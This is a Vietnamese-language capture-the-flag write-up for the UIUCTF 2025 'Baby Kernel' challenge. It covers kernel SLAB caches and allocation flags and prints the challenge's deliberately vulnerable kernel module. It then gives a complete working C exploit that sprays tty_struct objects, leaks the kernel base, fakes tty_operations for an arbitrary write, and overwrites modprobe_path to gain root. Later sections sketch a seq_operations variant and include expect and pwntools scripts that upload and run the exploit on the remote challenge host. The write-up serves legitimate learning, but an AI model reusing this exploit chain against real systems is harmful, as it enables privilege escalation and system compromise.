@@ -1,0 +1,487 @@
+--- 
+title: UIUCTF-2025
+date: 2025-05-18 00:00:00 +0800
+description: 'UIUCTF-2025'
+tags: ['kernel']
+author: ['kuvee']
+draft: false
+---
+
+## Baby Kernel 
+
+- đây là 1 bài heap kernel cơ bản , nhìn sơ qua thì ta có thể thấy được bug `uaf` nằm ở case `FREE` , và ở bài này ta có thể dùng `kzalloc` để cấp phát với size bất kì , và theo mình đối với những bài này heap kernel thì ta cần tìm 1 đối tượng phù hợp với cùng 1 SLAB cache , kernel tạo ra các SLAB cache để giữ các chunk có cùng size , như `kmalloc-16` , `kmalloc-32`  , vì vậy nếu `vuln` xảy ra ở `kmalloc-256` thì phải có 1 đối tượng có thể được phân bổ cùng 1 SLAB cache `kmalloc-256` để khai thác 
+
+
+- ngoài ra nói thêm 1 chút , ở bài này nó dùng `kzalloc` thay vì `kmalloc` , mặc dù nó không liên quan đến bài này lắm @@ , sự khác nhau chính của 2 thằng này là `kmalloc` sẽ không gán giá trị ban đầu cho vùng nhớ này (các nội dung bên trong sẽ là rác) và sẽ nhanh hơn vì không cần khởi tạo dữ liệu , còn `kzalloc` sẽ tự động gán toàn bộ vùng nhớ về NULL vì vậy nó cần tốn thêm 1 chút hiệu suất , và trong driver code thì người ta thường ưu tiên `kzalloc` vì nó thường dùng những struct và họ cần set các field này về NULL để đảm bảo tránh các lỗi không đáng có ... 
+
+
+- 1 cái nữa cũng khá là thú vị là flags được sử dụng với `kzalloc` , Linux cung cấp rất nhiều API khác nhau để cấp phát memory như `malloc` , `kmem_cache_alloc` ... và hầu hết các `memory allocation APIs` này dùng `GFP` flags , nó là viết tắt của `Get Free Pages` , và những flags mình thường gặp là `GFP_KERNEL_ACCOUNT` và `GFP_KERNEL` : 
+
+
+```c
+kmalloc(size, GFP_KERNEL)
+
+kmalloc(size, GFP_KERNEL_ACCOUNT)
+```
+
+
+- sự khác biệt chính của 2 thứ này là khi dùng `GFP_KERNEL` thì `kmalloc` sẽ lấy memory từ kmalloc-size còn `GFP_KERNEL_ACCOUNT` sẽ từ `kmalloc-cg-<size>` (cg : control group) , ở đây không có 1 quy tắt cụ thể phải dùng flags nào và nó được sử dụng tùy vào trường hợp cụ thể , cái chính cần nói ở đây là nó sẽ tách biệt các `SLAB cache` khiến việc khai thác UAF trở nên khó khăn hơn . như đã nói thì các đối tượng do user kiểm soát và đối tượng muốn thực hiện tấn công phải nằm cùng 1 `SLAB cache` . Nếu `SLAB cache` chứa `vuln` được cấp phát với `GFP_KERNEL` , sẽ rất khó exploit vì nó khác cache `GFP_KERNEL_ACCOUNT` , giống như `User-controlled objects` ( `msg_msg` , `pipe_buffer` )  dùng `GFP_KERNEL_ACCOUNT` còn `Kernel-internal objects` (như các struct có function pointer, seq_file, timer_list, ...) thường dùng `GFP_KERNEL`  , nói tóm lại là flags khác nhau sẽ khác `SLAB cache` và ta sẽ không `reuse` được dẫn đến việc exploit trở nên khó khăn hơn 
+
+
+
+```c
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+#include <linux/miscdevice.h>
+#include <linux/fs.h>
+#include <linux/ioctl.h>
+#include <linux/uaccess.h>
+
+#define K1_TYPE 0xB9
+#define ALLOC _IOW(K1_TYPE, 0, size_t)
+#define FREE _IO(K1_TYPE, 1)
+#define USE_READ _IOR(K1_TYPE, 2, char)
+#define USE_WRITE _IOW(K1_TYPE, 2, char)
+
+long handle_ioctl(struct file *file, unsigned int cmd, unsigned long arg);
+
+struct file_operations fops = {
+    .owner = THIS_MODULE,
+    .unlocked_ioctl = handle_ioctl,
+};
+
+struct miscdevice vuln_dev ={
+    .minor = MISC_DYNAMIC_MINOR,
+    .name = "vuln",
+    .fops = &fops,
+};
+
+void* buf = NULL;
+size_t size = 0;
+
+long handle_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
+    switch (cmd) {
+        case ALLOC: {
+            if (buf) {
+                return -EFAULT;
+            }
+            ssize_t n =  copy_from_user(&size, (void*)arg, sizeof(size_t));
+            if (n != 0) {
+                return n;
+            }
+            buf = kzalloc(size, GFP_KERNEL);
+            return 0;
+        };
+        case FREE: {
+            if (!buf) {
+                return -EFAULT;
+            }
+            kfree(buf);
+            break;
+        }
+        case USE_READ: {
+            if (!buf) {
+                return -EFAULT;
+            }
+            return copy_to_user((char*)arg, buf, size);
+        }
+
+        case USE_WRITE: {
+            if (!buf) {
+                return -EFAULT;
+            }
+            return copy_from_user(buf, (char*)arg, size);
+        }
+
+        default: {
+            break;
+        }
+
+    }
+    return 0;
+}
+
+int32_t vuln_init(void) {
+    int ret;
+
+    ret = misc_register(&vuln_dev);
+    if (ret) {
+        printk(KERN_ERR "Failed to register device\n");
+        return ret;
+    }
+    return 0;
+}
+
+void vuln_exit(void) {
+    misc_deregister(&vuln_dev);
+}
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("UIUCTF Inc.");
+MODULE_DESCRIPTION("Vulnerable Kernel Module");
+module_init(vuln_init);
+module_exit(vuln_exit);
+```
+
+- quay trở lại bài thì ở bài này vì được allocate 1 size bất kì nên mình sẽ chọn `tty_struct`  , ta có thể đọc ở [đây](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#%E4%BB%BB%E6%84%8F%E3%83%87%E3%83%BC%E3%82%BF%E6%9B%B8%E3%81%8D%E8%BE%BC%E3%81%BFHeap-Spr...E4%BD%93) để tìm hiểu về các đối tượng có thể attack ,  flow exploit đơn giản sẽ là `alloc`  -> `free` -> `spray` -> `read` (leak kbase và heap) -> `write` (overwrite *ops) -> `ioctl` để trigger 
+
+```c
+struct tty_struct {
+	struct kref kref;
+	int index;
+	struct device *dev;
+	struct tty_driver *driver;
+	struct tty_port *port;
+	const struct tty_operations *ops;
+
+	struct tty_ldisc *ldisc;
+	struct ld_semaphore ldisc_sem;
+
+	struct mutex atomic_write_lock;
+	struct mutex legacy_mutex;
+	struct mutex throttle_mutex;
+	struct rw_semaphore termios_rwsem;
+	struct mutex winsize_mutex;
+	struct ktermios termios, termios_locked;
+	char name[64];
+	unsigned long flags;
+	int count;
+	unsigned int receive_room;
+	struct winsize winsize;
+
+	struct {
+		spinlock_t lock;
+		bool stopped;
+        bool tco_stopped;
+		unsigned long unused[0];
+	} __aligned(sizeof(unsigned long)) flow;
+```
+
+- sau khi thành công `leak` được `kbase` thì lúc này target sẽ là overwrite `modprobe_path` , ở đây mình sẽ tìm 1 gadget có dạng như `mov  [rdx], ecx ; ret ;` để thực hiện AAW 4 byte , và sau 1 lúc mò mẫm thì mình xài `ropr` , nhưng có 1 điều là `ropr` sẽ dump hết tất cả các gadget ( bao gồm các gadget ngoài vùng .text) , mình nhận ra được điều này khi kernel trả về lỗi : 
+
+
+```
+BUG: unable to handle page fault for address: ffffffff827fcfdd
+#PF: supervisor instruction fetch in kernel mode
+#PF: error_code(0x0011) - permissions violation
+kernel tried to execute NX-protected page - exploit attempt?
+```
+
+- sau đó mình dùng 1 cách khác là dump dữ liệu .text ở kernel ra file ra dùng `rp-lin` để tìm gadget
+
+```c
+dump binary memory text.bin 0xffffffff81000000 0xffffffff81abc000  (in gdb)
+
+
+rp-lin \
+  --file text.bin \
+  --raw 1 \
+  --va 0xffffffff81000000 \
+  --unique \
+  -r 6 \
+  > rp_gadgets.txt
+
+
+grep '\[rdx\]' rp_gadgets.txt
+grep 'mov \[rcx\]' rp_gadgets.txt
+```
+
+- ngoài ra mình cũng dùng `kload ./vmlinux`  , `kmod-load vuln ./vuln.ko` để lấy symbol của module và kernel để dễ debug hơn , tiếp theo là dùng `kops  tty_operations -n`  để check xem `ioctl` nằm ở idx bao nhiêu trong `tty_operations`  , hoặc là check trong src  , muốn kiểm tra xem ta đã fake tty_operation chuẩn chưa thì thêm `kops  tty_operations [address] -n`
+
+![image](https://hackmd.io/_uploads/HJgIc9NDel.png)
+
+
+![image](https://hackmd.io/_uploads/r14D95Evee.png)
+
+- ở bên dưới là sau khi `*ops` đã bị overwrite thành 1 địa chỉ heap chứa các thành viên trong `tty_struct` mà mình đã fake , lúc này nếu gọi `ioctl` -> `mov  [rdx], ecx ; ret ;` và ta có 1 `AAW32`
+
+![image](https://hackmd.io/_uploads/B1ZRo5Vvlg.png)
+
+- việc cuối cùng là overwrite `modprobe_path` và got `root` 
+
+exp: 
+
+
+```c
+#include <fcntl.h>
+#include <stddef.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <unistd.h>
+#define VULN "/dev/vuln"
+#define K1_TYPE 0xB9
+#define ALLOC _IOW(K1_TYPE, 0, size_t)
+#define FREE _IO(K1_TYPE, 1)
+#define USE_READ _IOR(K1_TYPE, 2, char)
+#define USE_WRITE _IOW(K1_TYPE, 2, char)
+#define SPRAY_NUM 100
+
+typedef uint64_t u64;
+typedef int64_t i64;
+
+int spray[SPRAY_NUM];
+
+void fatal(char *msg) {
+  perror(msg);
+  exit(-1);
+}
+void get_flag() {
+  system("echo '#!/bin/sh\ncp /flag.txt /tmp/flag.txt\nchmod 777 "
+         "/tmp/flag.txt' > /tmp/ku");
+  system("chmod +x /tmp/ku");
+  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/trigger");
+  system("chmod +x /tmp/trigger");
+  system("/tmp/trigger > /dev/null 2>&1");
+  puts("[+] Reading flag...");
+  system("cat /tmp/flag.txt; echo");
+  exit(0);
+}
+void AAW32(unsigned long addr, unsigned int val) {
+  printf("[*] AAW: writing 0x%x at 0x%lx\n", val, addr);
+    ioctl(spray[0], val /* rcx */, addr /* rdx */);
+}
+int main() {
+  printf("open /dev/vuln\n");
+  int fd = open(VULN, O_RDWR);
+  if (fd < 0) {
+    fatal("open failed");
+  }
+
+  size_t size = 0x400;
+  puts("[*] ALLOC");
+  ioctl(fd, ALLOC, &size);
+  puts("[*] FREE1");
+
+  if (ioctl(fd, FREE) < 0) {
+    fatal("ioctl FREE");
+  }
+  puts("[*] SPRAYING");
+  for (int i = 0; i < 100; i++) {
+    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
+    if (spray[i] == -1) {
+      fatal("spray");
+    }
+  }
+
+  char buf[0x400];
+  ioctl(fd, USE_READ, &buf);
+  u64 *leak = (u64 *)buf;
+  for (int i = 0; i < 20; i++) {
+    printf("buf[%d]: 0x%016lx\n", i, leak[i]);
+  }
+  u64 kbase = leak[4] - (0xffffffff82285100 - 0xffffffff81000000);
+  printf("kbase: 0x%lx\n", kbase);
+  u64 g_buf = leak[9] - 0x40;
+  printf("buf: 0x%lx\n", g_buf);
+  puts("FREE again");
+  // 0xffffffff827fcfdd: mov [rdx], ecx; ret;
+  i64 gadget = kbase + (0xffffffff827fcfdd - kbase);
+  printf("found gadget: 0x%lx\n", gadget);
+  leak[4] = g_buf + 0x2b0;
+  // leak[86] = kbase + (0xffffffff816159d0 - kbase);
+  // leak[87] = kbase + (0xffffffff816164e0 - kbase);
+  // leak[88] = kbase + (0xffffffff816159f0 - kbase);
+  // leak[89] = kbase + (0xffffffff81615a50 - kbase); // open
+  // leak[90] = kbase + (0xffffffff81615d30 - kbase); // close
+  // leak[92] = kbase + (0xffffffff81615d10 - kbase); // cleanup
+  // leak[93] = kbase + (0xffffffff81615cd0 - kbase); // write
+  leak[96] = kbase + (0xffffffff816164a0 - kbase); // write_room
+  // good? 0xffffffff8107473b mov qword [rdx], rcx ; ret ; (9 found)
+  // 0xffffffff81b3913c: mov dword ptr [rcx], 0x1c2450f; ret;
+  // final 0xffffffff81018518: mov  [rdx], ecx ; ret ; (43 found)
+  i64 test = kbase + (0xffffffff81b3913c - kbase);
+  i64 good = kbase + (0xffffffff8107473b - kbase);
+  i64 final = kbase + (0xffffffff81018518 - kbase);
+  printf("good???? 0x%lx", good);
+  // leak[98] = 0xdeadbeefcafebabe;
+  leak[98] = final;
+  // leak[99] = kbase + (0xffffffff816161c0 - kbase);
+  // leak[102] = kbase + (0xffffffff81615c90 - kbase);
+  // leak[107] = kbase + (0xffffffff81615ae0 - kbase);
+
+  printf("target ops: 0x%lx\n", g_buf + 0x2b0);
+  i64 mod_probe = kbase + (0xffffffff82b3f600 - kbase);
+  printf("mod probe: 0x%lx\n", mod_probe);
+  printf("final gadget: 0x%lx\n", final);
+  ioctl(fd, USE_WRITE, &buf);
+  AAW32(mod_probe + 0x0, *(uint32_t *)"/tmp");
+  AAW32(mod_probe + 0x4, *(uint32_t *)"/ku\0");
+  puts("wut");
+  get_flag();
+  return 0;
+}
+```
+
+![image](https://hackmd.io/_uploads/Bkm-ljVvee.png)
+
+
+ref: 
+
+https://docs.kernel.org/core-api/memory-allocation.html 
+
+https://stackoverflow.com/questions/28633884/why-driver-programming-prefer-kzalloc-over-kmalloc
+
+https://sam4k.com/exploring-linux-random-kmalloc-caches/
+
+https://hackmd.io/@bata24/ByA_8LeEQ?type=view
+
+
+
+update : `8/7/2025` 
+
+đây có lẽ là part2 mình làm về bài này , sau khi đọc writeup của `0xM4hm0ud` và mình cũng vừa học được về cách epxloit với `seq_opeartion` (https://0xm4hm0ud.me/posts/uiuctf-2025)
+
+
+- về ý tưởng thì cũng tương tự với cách ở trên :  `alloc` -> `free` -> `spray` -> `read` -> `write` . nhưng điểm khác là đối tượng attack lần này sẽ là `seq_operation`
+
+
+struct này chứa 4 `function pointers` 
+
+![image](https://hackmd.io/_uploads/SJ7I7-zugg.png)
+
+- ta cần mở 1 file sử dụng `single_open` . vd như `/proc/self/stat`
+
+![image](https://hackmd.io/_uploads/rJIcIWG_gg.png)
+
+- và nếu như ta thực hiện read với file description đó , nó sẽ gọi `seq_read`  . ở hàm này nó thực hiện khá nhiều công việc , tuy nhiên ta chỉ cần để ý đến 2 điểm : 
+
+```
+p = m->op->start(m, &m->index);
+m->op->stop(m, p);
+```
+
+- như ở trên thì ta sẽ thấy nó gọi `start` và `stop` và cũng chính là con trỏ hàm ở `seq_operations` , về `stop` thì mình chưa thấy ai trigger thằng này bao giờ ... 
+
+
+
+![image](https://hackmd.io/_uploads/B1pxPZfOle.png)
+
+
+- vậy flow exploit sẽ như sau: 
+
+`alloc` -> `free` -> `open("/proc/seft/stat")` -> `read` (leak) -> `write` (overwrite start)
+
+- ở bài này `SMEP` , `SMAP` và `KPTI` đều được bật , có nghĩa là ta không thể gọi `commit_creds(init_task)` đặt ở `userspace` như bình thường 
+
+
+
+- ta thấy khi call `read` để trigger `commit_creds(init_creds)` thì `unable to execute userspace code (SMEP?)` xuất hiện 
+
+```c
+void priveleged(u64 commit_creds, u64 init_task) {
+  ((void (*)(void *))commit_creds)((void *)init_task);
+}
+```
+
+![image](https://hackmd.io/_uploads/SJmxEwXOge.png)
+
+- có nghĩa là lúc này ta cần thực hiện `krop` thay vì cách trên 
+
+
+
+
+
+```
+#!/usr/bin/expect -f
+#
+# upload_and_run.exp — wait for prompt, push exploit, exec it
+# build first the exploit.c with gcc -static -O2 -no-pie -o exploit exploit.c
+
+# 1) configure
+set timeout -1
+set host    "baby-kernel.chal.uiuc.tf"
+set port    1337
+set b64file "exploit.b64"
+
+# 2) spawn netcat
+spawn ncat --ssl $host $port
+
+# 3) wait for the shell prompt
+expect {
+    -re {~ \$ } {
+        puts {[*] got prompt, uploading exploit...}
+    }
+    timeout {
+        puts {[-] timed out waiting for prompt}
+        exit 1
+    }
+}
+
+# 4) start the here-doc in the guest
+send -- "cat > /tmp/exploit.b64 << 'EOB64'\r"
+
+# 5) send each line of the local base64 file
+set fh [open $b64file r]
+while {[gets $fh line] >= 0} {
+    send -- "$line\r"
+}
+close $fh
+
+# 6) close the here-doc, decode, chmod, run
+send -- "EOB64\r"
+send -- "base64 -d /tmp/exploit.b64 > /tmp/exploit\r"
+send -- "chmod +x /tmp/exploit\r"
+send -- "/tmp/exploit\r"
+
+# 7) hand control back to you
+interact
+```
+
+
+```
+#!/usr/bin/python3
+from pwn import *
+
+def send_command(cmd, print_cmd = True, print_resp = False):
+    if print_cmd:
+        log.info(cmd)
+
+    p.sendlineafter(b"$", cmd)
+    resp = p.recvuntil(b"$")
+
+    if print_resp:
+        log.info(resp)
+
+    p.unrecv(b"$")
+    return resp
+
+def send_file(src, dst):
+    file = read(src)    
+    f = b64e(file)
+    
+    # Handle both string and bytes return from b64e
+    if isinstance(f, bytes):
+        f = f.decode()
+
+    send_command("rm -f {}.b64".format(dst))
+    send_command("rm -f {}".format(dst))
+
+    size = 800
+    for i in range(len(f)//size + 1):
+        chunk = f[i*size:(i+1)*size]
+        if chunk:  # Only send non-empty chunks
+            log.info("Sending chunk {}/{}".format(i, len(f)//size))
+            send_command("echo -n '{}' >> {}.b64".format(chunk, dst), False)
+
+    send_command("cat {}.b64 | base64 -d > {}".format(dst, dst))
+    send_command("chmod +x {}".format(dst))
+
+if __name__ == "__main__":
+    if len(sys.argv) != 5:
+        print("usage: ./send.py <IP> <PORT> <FILE TO SEND> <PATH ON REMOTE>")
+        exit(-1)
+    
+    # For SSL connections
+    context.log_level = 'info'
+    p = remote(sys.argv[1], int(sys.argv[2]), ssl=True)
+    
+    send_file(sys.argv[3], sys.argv[4])
+    
+    
+    p.interactive()
+```
